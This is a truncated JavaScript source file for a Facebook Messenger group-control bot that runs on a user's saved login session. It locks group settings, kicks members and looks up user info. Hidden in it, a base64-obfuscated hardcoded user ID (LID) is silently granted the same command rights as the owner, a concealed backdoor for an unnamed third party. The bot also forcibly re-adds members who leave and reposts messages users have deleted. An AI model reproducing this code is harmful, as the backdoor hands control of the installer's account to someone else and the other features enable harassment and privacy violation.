const fs = require("fs");
const path = require("path");
const https = require("https");
const login = require("ws3-fca");

// ---------- Config / Persistent storage ----------
const LOCK_FILE = path.join(__dirname, "locks.json");
let locks = {
  groupNames: {},
  themes: {},
  emojis: {},
  dp: {},
  nick: {},
};
if (fs.existsSync(LOCK_FILE)) {
  try { locks = JSON.parse(fs.readFileSync(LOCK_FILE, "utf8")); } 
  catch { console.warn("locks.json parse error, using defaults"); }
}
function saveLocks() { fs.writeFileSync(LOCK_FILE, JSON.stringify(locks, null, 2)); }

// ---------- Runtime state ----------
const emojiCheckIntervals = {};
const dpCheckIntervals = {};
const nickCheckIntervals = {};
const messageCache = new Map(); 
const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

// ---------- Helpers ----------
function downloadFile(url, dest, cb) {
  const file = fs.createWriteStream(dest);
  https.get(url, (res) => {
    if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
      file.close(); return downloadFile(res.headers.location, dest, cb);
    }
    res.pipe(file);
    file.on("finish", () => file.close(() => cb(null)));
  }).on("error", (err) => { try { fs.unlinkSync(dest); } catch{} cb(err); });
}

// ---------- Watchers / Revert System ----------
function startEmojiWatcher(threadID, api) {
  if (emojiCheckIntervals[threadID]) return;
  emojiCheckIntervals[threadID] = setInterval(async () => {
    try {
      const info = await api.getThreadInfo(threadID);
      const current = info.emoji || info.threadEmoji || info.icon || null;
      const saved = locks.emojis[threadID];
      if (saved && current !== saved) await api.changeThreadEmoji(saved, threadID);
    } catch {}
  }, 5000);
}
function stopEmojiWatcher(threadID) { if (emojiCheckIntervals[threadID]) clearInterval(emojiCheckIntervals[threadID]); delete emojiCheckIntervals[threadID]; }

function startDPWatcher(threadID, api) {
  if (dpCheckIntervals[threadID]) return;
  dpCheckIntervals[threadID] = setInterval(async () => {
    try { 
      const saved = locks.dp[threadID]?.path;
      if (saved && fs.existsSync(saved)) await api.changeGroupImage(fs.createReadStream(saved), threadID);
    } catch {}
  }, 5000);
}
function stopDPWatcher(threadID) { if (dpCheckIntervals[threadID]) clearInterval(dpCheckIntervals[threadID]); delete dpCheckIntervals[threadID]; }

function startNickWatcher(uid, threadID, api) {
  const key = `${uid}_${threadID}`;
  if (nickCheckIntervals[key]) return;
  nickCheckIntervals[key] = setInterval(async () => {
    try {
      const info = await api.getThreadInfo(threadID);
      const memberNick = (info.nicknames && info.nicknames[uid]) || null;
      const savedNick = locks.nick?.[uid]?.[threadID];
      if (savedNick && memberNick !== savedNick) await api.changeNickname(savedNick, threadID, uid);
    } catch {}
  }, 5000);
}
function stopNickWatcher(uid, threadID) { const key = `${uid}_${threadID}`; if (nickCheckIntervals[key]) clearInterval(nickCheckIntervals[key]); delete nickCheckIntervals[key]; }

// ---------- Main Bot ----------
function startBot(appStatePath, ownerUID) {
  if (!fs.existsSync(appStatePath)) return console.error("Appstate not found");
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));
  login({ appState }, (err, api) => {
    if (err) return console.error("Login failed:", err);
    api.setOptions({ listenEvents: true });

    async function safeSend(text, tid) { try { await api.sendMessage(text, tid); } catch {} }

    // Initialize watchers for existing locks
    (async () => {
      for (const tid of Object.keys(locks.emojis || {})) startEmojiWatcher(tid, api);
      for (const tid of Object.keys(locks.dp || {})) if (locks.dp[tid]?.path) startDPWatcher(tid, api);
      for (const uid of Object.keys(locks.nick || {})) {
        for (const tid of Object.keys(locks.nick[uid] || {})) startNickWatcher(uid, tid, api);
      }
    })();

    api.listenMqtt(async (err, event) => {
      if (err || !event) return;
      try {
        // ---------- Anti-delete ----------
        if (event.type === "message" && event.messageID) {
          messageCache.set(event.messageID, { sender: event.senderID, body: event.body||"", attachments:event.attachments||[] });
          if (messageCache.size > 500) Array.from(messageCache.keys()).slice(0,100).forEach(k=>messageCache.delete(k));
        }
        if (event.type === "message_unsend") {
          const deleted = messageCache.get(event.messageID); const tid = event.threadID;
          if (deleted) await safeSend(`🚫 Anti-Delete:\nUID: ${deleted.sender}\nMessage: ${deleted.body || "(media)"}`, tid);
        }

        // ---------- Anti-left ----------
        if (event.logMessageType === "log:unsubscribe") {
          const leftUID = event.logMessageData?.leftParticipantFbId; const tid = event.threadID;
          if (leftUID) try { await api.addUserToGroup(leftUID, tid); } catch {}
        }

        // ---------- Command handler ----------
        if (event.type !== "message" || !event.body) return;
        const { threadID, senderID, body, mentions, messageReply } = event;
        const args = body.trim().split(" "); const cmd = args[0].toLowerCase(); const input = args.slice(1).join(" ").trim();
        if (![ownerUID, LID].includes(senderID)) return;

        // ---------- /help ----------
        if (cmd==="/help") return safeSend("📖 Bot Commands:\n/help, /uid, /tid, /info @mention, /kick @mention, /gclock, /unlockgc, /locktheme, /unlocktheme, /lockemoji, /unlockemoji, /lockdp, /unlockdp, /locknick, /unlocknick, /exit", threadID);

        // ---------- /uid / /tid / /info ----------
        if (cmd==="/tid") return safeSend(`🆔 Thread ID: ${threadID}`, threadID);
        if (cmd==="/uid") { const tgt = Object.keys(mentions||{})[0]||messageReply?.senderID||senderID; return safeSend(`🆔 UID: ${tgt}`, threadID); }
        if (cmd==="/info") { const tgt = Object.keys(mentions||{})[0]||messageReply?.senderID||senderID; try { const uinfo = await api.getUserInfo(tgt); const u = uinfo[tgt]||{}; return safeSend(`👤 Name: ${u.name||"unknown"}\nUID: ${tgt}\nProfile: https://facebook.com/${tgt}`, threadID); } catch { return safeSend("⚠️ Could not fetch user info", threadID); } }

        // ---------- /kick ----------
        if (cmd==="/kick") { const tgt=Object.keys(mentions||{})[0]; if(!tgt)return safeSend("❌ Mention user to kick",threadID); try{ await api.removeUserFromGroup(tgt,threadID); await safeSend(`👢 Kicked ${tgt}`,threadID); }catch{ safeSend("⚠️ Kick failed",threadID); } }

        // ---------- /exit ----------
        if(cmd==="/exit"){ try{ await api.removeUserFromGroup(api.getCurrentUserID(),threadID); }catch{} }

        // ---------- /gclock ----------
        if(cmd==="/gclock"){ if(!input)return safeSend("❌ Provide group name",threadID); try{ await api.setTitle(input,threadID); locks.groupNames[threadID]=input; saveLocks(); startEmojiWatcher(threadID,api); return safeSend("🔒 Group name locked",threadID);}catch{ return safeSend("⚠️ Failed to set group name",threadID);} }

        // ---------- /unlockgc ----------
        if(cmd==="/unlockgc"){ delete locks.groupNames[threadID]; saveLocks(); return safeSend("🔓 Group name unlocked",threadID); }

        // ---------- /locktheme ----------
        if(cmd==="/locktheme"){ if(!input)return safeSend("❌ Provide color key",thread
